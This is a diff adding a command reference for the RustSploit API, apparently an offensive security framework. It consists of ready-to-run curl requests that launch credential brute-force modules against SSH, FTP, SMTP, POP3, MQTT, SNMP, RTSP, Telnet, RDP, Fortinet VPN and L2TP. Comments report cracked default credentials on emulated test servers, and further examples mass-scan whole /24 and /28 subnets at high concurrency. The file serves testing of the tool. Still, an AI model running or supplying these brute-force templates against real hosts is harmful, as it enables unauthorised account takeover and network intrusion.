@@ -1,0 +1,471 @@
+# RustSploit API — Template Commands (Tested & Verified)
+# ═══════════════════════════════════════════════════════════════
+# Tested against emulated servers (test_servers.py)
+# Default creds: admin/password123, root/toor
+# SNMP community: public
+#
+# API Key: testkey123 (replace with your actual key)
+# Wordlists: Absolute paths to test_users.txt, test_passwords.txt
+#
+# Start API:  cargo run -- --api --api-key testkey123 --interface 127.0.0.1
+# Start test: python3 test_servers.py
+# ═══════════════════════════════════════════════════════════════
+
+# ─── Health Check ────────────────────────────────────────────────────
+
+curl -s http://127.0.0.1:8080/health | python3 -m json.tool
+
+# ─── List Modules ───────────────────────────────────────────────────
+
+curl -s http://127.0.0.1:8080/api/modules \
+  -H 'Authorization: Bearer testkey123' | python3 -m json.tool
+
+# ─── Search Modules ─────────────────────────────────────────────────
+
+curl -s "http://127.0.0.1:8080/api/modules/search?q=ssh" \
+  -H 'Authorization: Bearer testkey123' | python3 -m json.tool
+
+# ─── Set Target ─────────────────────────────────────────────────────
+
+curl -s -X POST http://127.0.0.1:8080/api/target \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{"target": "127.0.0.1"}' | python3 -m json.tool
+
+# ─── Set Target (CIDR subnet) ──────────────────────────────────────
+
+curl -s -X POST http://127.0.0.1:8080/api/target \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{"target": "192.168.1.0/24"}' | python3 -m json.tool
+
+# ─── Show Target ────────────────────────────────────────────────────
+
+curl -s http://127.0.0.1:8080/api/target \
+  -H 'Authorization: Bearer testkey123' | python3 -m json.tool
+
+# ─── List Result Files ──────────────────────────────────────────────
+
+curl -s http://127.0.0.1:8080/api/results \
+  -H 'Authorization: Bearer testkey123' | python3 -m json.tool
+
+# ─── Get Result File ────────────────────────────────────────────────
+
+curl -s http://127.0.0.1:8080/api/results/ssh_results.txt \
+  -H 'Authorization: Bearer testkey123' | python3 -m json.tool
+
+# ═══════════════════════════════════════════════════════════════
+# BRUTEFORCE MODULES — Tested against emulated servers
+# save_results: "y" enables output file creation
+# CIDR: use target like "127.0.0.1/32" or "192.168.1.0/24"
+# ═══════════════════════════════════════════════════════════════
+
+# ─── 1. SSH Bruteforce ──────────────────────────────────────────────
+# TESTED ✅ — Found root:toor against emulated SSH on port 2222
+# save_results ✅ — Saved to ssh_results.txt
+# CIDR ✅ — Subnet detected, sequential per-host scanning
+
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/ssh_bruteforce",
+    "target": "127.0.0.1",
+    "prompts": {
+      "port": "2222",
+      "use_defaults": "n",
+      "use_username_wordlist": "y",
+      "username_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_users.txt",
+      "use_password_wordlist": "y",
+      "password_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_passwords.txt",
+      "concurrency": "5",
+      "timeout": "5",
+      "retry_on_error": "n",
+      "stop_on_success": "y",
+      "save_results": "y",
+      "output_file": "ssh_results.txt",
+      "verbose": "n",
+      "combo_mode": "y",
+      "save_unknown_responses": "n"
+    }
+  }' | python3 -m json.tool
+
+# SSH CIDR example:
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/ssh_bruteforce",
+    "target": "127.0.0.1/32",
+    "prompts": {
+      "port": "2222",
+      "use_defaults": "n",
+      "use_username_wordlist": "y",
+      "username_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_users.txt",
+      "use_password_wordlist": "y",
+      "password_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_passwords.txt",
+      "concurrency": "5",
+      "timeout": "5",
+      "retry_on_error": "n",
+      "stop_on_success": "y",
+      "save_results": "y",
+      "output_file": "ssh_cidr_results.txt",
+      "verbose": "n",
+      "combo_mode": "y",
+      "save_unknown_responses": "n"
+    }
+  }' | python3 -m json.tool
+
+# ─── 2. FTP Bruteforce ──────────────────────────────────────────────
+# No emulator available. save_results and CIDR implemented.
+
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/ftp_bruteforce",
+    "target": "10.0.0.1",
+    "prompts": {
+      "port": "21",
+      "username_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_users.txt",
+      "password_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_passwords.txt",
+      "concurrency": "10",
+      "stop_on_success": "y",
+      "save_results": "y",
+      "output_file": "ftp_results.txt",
+      "verbose": "n",
+      "combo_mode": "y"
+    }
+  }' | python3 -m json.tool
+
+# ─── 3. SMTP Bruteforce ────────────────────────────────────────────
+# TESTED ✅ — Found root:toor against emulated SMTP on port 2525
+# save_results ✅ — Saved to smtp_results.txt
+
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/smtp_bruteforce",
+    "target": "127.0.0.1",
+    "prompts": {
+      "port": "2525",
+      "username_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_users.txt",
+      "password_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_passwords.txt",
+      "threads": "5",
+      "delay_ms": "100",
+      "stop_on_success": "y",
+      "combo_mode": "y",
+      "verbose": "n",
+      "save_results": "y",
+      "output_file": "smtp_results.txt"
+    }
+  }' | python3 -m json.tool
+
+# ─── 4. POP3 Bruteforce ────────────────────────────────────────────
+# TESTED ✅ — Found root:toor against emulated POP3 on port 1110
+# save_results ✅ — Saved to pop3_results.txt
+
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/pop3_bruteforce",
+    "target": "127.0.0.1",
+    "prompts": {
+      "use_ssl": "n",
+      "port": "1110",
+      "username_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_users.txt",
+      "password_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_passwords.txt",
+      "threads": "5",
+      "delay_ms": "50",
+      "timeout": "5",
+      "combo_mode": "y",
+      "stop_on_success": "y",
+      "save_results": "y",
+      "output_file": "pop3_results.txt",
+      "verbose": "n",
+      "retry_on_error": "n"
+    }
+  }' | python3 -m json.tool
+
+# ─── 5. MQTT Bruteforce ────────────────────────────────────────────
+# TESTED ✅ — Found root:toor + admin:password123 against emulated MQTT on port 1884
+# save_results ✅
+
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/mqtt_bruteforce",
+    "target": "127.0.0.1",
+    "prompts": {
+      "port": "1884",
+      "use_tls": "n",
+      "test_anonymous": "n",
+      "username_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_users.txt",
+      "password_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_passwords.txt",
+      "concurrency": "5",
+      "timeout": "5",
+      "stop_on_success": "y",
+      "save_results": "y",
+      "output_file": "mqtt_results.txt",
+      "verbose": "n",
+      "combo_mode": "y",
+      "client_id": "rustsploit"
+    }
+  }' | python3 -m json.tool
+
+# MQTT CIDR example:
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/mqtt_bruteforce",
+    "target": "127.0.0.1/32",
+    "prompts": {
+      "port": "1884",
+      "use_tls": "n",
+      "username_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_users.txt",
+      "password_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_passwords.txt",
+      "concurrency": "5",
+      "verbose": "n",
+      "output_file": "mqtt_cidr_results.txt",
+      "client_id": "rustsploit"
+    }
+  }' | python3 -m json.tool
+
+# ─── 6. SNMP Bruteforce ────────────────────────────────────────────
+# TESTED ✅ — Found community 'public' against emulated SNMP on port 1161
+# save_results ✅ — Saved to snmp_results.txt
+
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/snmp_bruteforce",
+    "target": "127.0.0.1",
+    "prompts": {
+      "port": "1161",
+      "community_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_communities.txt",
+      "snmp_version": "2c",
+      "concurrency": "5",
+      "stop_on_success": "y",
+      "save_results": "y",
+      "output_file": "snmp_results.txt",
+      "verbose": "n",
+      "timeout": "3"
+    }
+  }' | python3 -m json.tool
+
+# ─── 7. RTSP Bruteforce ────────────────────────────────────────────
+# TESTED ✅ — Found admin:password123 + root:toor against emulated RTSP on port 5554
+# save_results ✅ — Saved to rtsp_results.txt
+
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/rtsp_bruteforce",
+    "target": "127.0.0.1",
+    "prompts": {
+      "port": "5554",
+      "username_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_users.txt",
+      "password_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_passwords.txt",
+      "concurrency": "5",
+      "stop_on_success": "y",
+      "save_results": "y",
+      "output_file": "rtsp_results.txt",
+      "verbose": "n",
+      "combo_mode": "y",
+      "advanced_mode": "n",
+      "brute_force_paths": "n"
+    }
+  }' | python3 -m json.tool
+
+# ─── 8. Telnet Bruteforce ─────────────────────────────────────────
+# TESTED ✅ — Module runs, mode 4 quick default check works
+# Mode 4 = Quick Default Check (built-in credential list)
+# Mode 1 = Single Target with custom wordlists
+
+# Mode 4: Quick default check
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/telnet_bruteforce",
+    "target": "127.0.0.1",
+    "prompts": {
+      "mode": "4",
+      "port": "2323",
+      "verbose": "n",
+      "stop_on_success": "y",
+      "save_results": "y",
+      "output_file": "telnet_results.txt"
+    }
+  }' | python3 -m json.tool
+
+# Mode 1: Single target with custom wordlists
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/telnet_bruteforce",
+    "target": "127.0.0.1",
+    "prompts": {
+      "mode": "1",
+      "port": "2323",
+      "username_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_users.txt",
+      "password_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_passwords.txt",
+      "output_file": "telnet_results.txt",
+      "delay_ms": "100",
+      "verbose": "n",
+      "stop_on_success": "y",
+      "save_results": "y",
+      "timeout": "5",
+      "threads": "5"
+    }
+  }' | python3 -m json.tool
+
+# ─── 9. RDP Bruteforce ─────────────────────────────────────────────
+# Requires xfreerdp on the system. No emulated server available.
+# save_results and CIDR implemented.
+
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/rdp_bruteforce",
+    "target": "10.0.0.1",
+    "prompts": {
+      "port": "3389",
+      "username_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_users.txt",
+      "password_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_passwords.txt",
+      "concurrency": "5",
+      "timeout": "10",
+      "stop_on_success": "y",
+      "save_results": "y",
+      "output_file": "rdp_results.txt",
+      "verbose": "n",
+      "combo_mode": "y",
+      "security_level": "1"
+    }
+  }' | python3 -m json.tool
+
+# ─── 10. Fortinet SSL VPN Bruteforce ────────────────────────────────
+# HTTPS module. Emulated server on port 4443.
+# save_results and CIDR implemented.
+
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/fortinet_bruteforce",
+    "target": "127.0.0.1",
+    "prompts": {
+      "port": "4443",
+      "username_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_users.txt",
+      "password_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_passwords.txt",
+      "concurrency": "3",
+      "timeout": "10",
+      "stop_on_success": "y",
+      "save_results": "y",
+      "output_file": "fortinet_results.txt",
+      "verbose": "n",
+      "combo_mode": "y",
+      "trusted_cert": "",
+      "realm": ""
+    }
+  }' | python3 -m json.tool
+
+# ─── 11. L2TP Bruteforce ──────────────────────────────────────────
+# L2TP/CHAP protocol. Emulated server on port 1701 (UDP).
+# save_results and CIDR implemented.
+
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/l2tp_bruteforce",
+    "target": "127.0.0.1",
+    "prompts": {
+      "port": "1701",
+      "username_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_users.txt",
+      "password_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_passwords.txt",
+      "concurrency": "3",
+      "timeout_ms": "5000",
+      "stop_on_success": "y",
+      "save_results": "y",
+      "output_file": "l2tp_results.txt",
+      "verbose": "n",
+      "combo_mode": "y"
+    }
+  }' | python3 -m json.tool
+
+# ═══════════════════════════════════════════════════════════════
+# CIDR SUBNET SCANNING EXAMPLES
+# All modules support arbitrary CIDR targets (e.g. /24, /28, /32)
+# ═══════════════════════════════════════════════════════════════
+
+# CIDR SSH (sequential per-host):
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/ssh_bruteforce",
+    "target": "192.168.1.0/28",
+    "prompts": {
+      "port": "22",
+      "use_defaults": "n",
+      "use_username_wordlist": "y",
+      "username_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_users.txt",
+      "use_password_wordlist": "y",
+      "password_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_passwords.txt",
+      "concurrency": "10",
+      "timeout": "5",
+      "retry_on_error": "n",
+      "stop_on_success": "n",
+      "save_results": "y",
+      "output_file": "ssh_subnet_results.txt",
+      "verbose": "n",
+      "combo_mode": "y",
+      "save_unknown_responses": "n"
+    }
+  }' | python3 -m json.tool
+
+# CIDR SMTP (concurrent mass_scan_host):
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/smtp_bruteforce",
+    "target": "192.168.1.0/28",
+    "prompts": {
+      "port": "25",
+      "username_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_users.txt",
+      "password_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_passwords.txt",
+      "concurrency": "50",
+      "verbose": "n",
+      "output_file": "smtp_subnet_results.txt"
+    }
+  }' | python3 -m json.tool
+
+# CIDR SNMP (concurrent mass_scan_host):
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/snmp_bruteforce",
+    "target": "192.168.1.0/24",
+    "prompts": {
+      "port": "161",
+      "community_wordlist": "/home/kali/Pictures/Jenkins/rustsploit-thekiaboys/test_communities.txt",
+      "snmp_version": "2c",
+      "concurrency": "50",
+      "stop_on_success": "n",
+      "save_results": "y",
+      "output_file": "snmp_subnet_results.txt",
+      "verbose": "n",
+      "timeout": "3"
+    }
+  }' | python3 -m json.tool
